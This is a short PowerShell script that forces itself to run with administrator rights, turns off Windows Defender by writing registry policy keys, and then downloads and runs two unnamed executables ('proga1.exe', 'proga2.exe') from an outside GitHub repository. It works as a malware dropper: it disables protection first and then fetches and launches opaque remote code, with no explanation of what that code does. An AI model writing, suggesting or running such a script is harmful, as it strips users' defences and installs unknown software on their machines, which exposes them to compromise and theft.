Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { $workingDirOverride = (Get-Location).Path }

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

# Disable Windows Defender
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"
$SignatureUpdatesKey = "Signature Updates"
$SpynetKey = "Spynet"

$DisableAntiSpywareValue = "DisableAntiSpyware"
$DisableAntiVirusValue = "DisableAntiVirus"

if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force
New-Item -Path "$DefenderPath\$SignatureUpdatesKey" -Force
New-Item -Path "$DefenderPath\$SpynetKey" -Force

New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiSpywareValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiVirusValue" -Value "1" -PropertyType Dword -Force

Write-Host "Windows Defender DISABLED" -ForegroundColor Green

# Download and run proga1.exe and proga2.exe
$tempFolder = [System.IO.Path]::GetTempPath()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$baseUrl = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/"
$files = @("proga1.exe", "proga2.exe")

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

foreach ($file in $files) {
    $url = $baseUrl + $file
    $dest = Join-Path $tempFolder $file
    Write-Host "Downloading $file..." -ForegroundColor Yellow
    try {
        $wc.DownloadFile($url, $dest)
        Write-Host "Running $file" -ForegroundColor Green
        Start-Process -FilePath $dest
    } catch {
        Write-Host "Failed: $file - $_" -ForegroundColor Red
    }
}

Write-Host "ALL DONE" -ForegroundColor Green
Pause
